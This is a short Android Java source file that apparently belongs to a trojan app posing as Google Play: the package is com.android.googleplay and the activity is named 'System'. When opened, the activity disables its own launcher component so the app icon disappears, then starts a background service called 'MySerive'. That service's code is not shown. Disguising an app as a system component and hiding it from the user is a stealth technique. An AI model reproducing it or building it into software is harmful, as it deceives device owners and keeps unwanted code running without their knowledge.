package com.android.googleplay;


import com.android.googleplay.R;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class System extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.system_activity);

		PackageManager pm = getApplicationContext().getPackageManager();
		pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP); 

		Intent myIntent1 = new Intent(System.this, MySerive.class);
		startService(myIntent1);
	}
}
